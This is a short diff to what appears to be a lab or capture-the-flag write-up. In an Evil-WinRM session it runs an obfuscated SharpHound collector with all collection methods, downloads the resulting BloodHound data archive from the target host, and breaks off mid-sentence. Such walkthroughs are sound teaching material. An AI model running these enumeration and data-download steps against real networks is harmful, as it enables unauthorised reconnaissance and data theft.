@@ -1197,7 +1197,15 @@ Now its uploaded ill execute it!
 ```python
 *Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> .\SharpHound.exe._obf.exe -c All
 
+...[SNIP]...
 
+*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> download 20260503094651_BloodHound.zip
+                                        
+Info: Downloading C:\Users\cliff.b\Task Scripts\20260503094651_BloodHound.zip to 20260503094651_BloodHound.zip
+                                        
+Info: Download successful!
 ```
+Here i am executing it and then downloading the data
 
+So now ill 
 
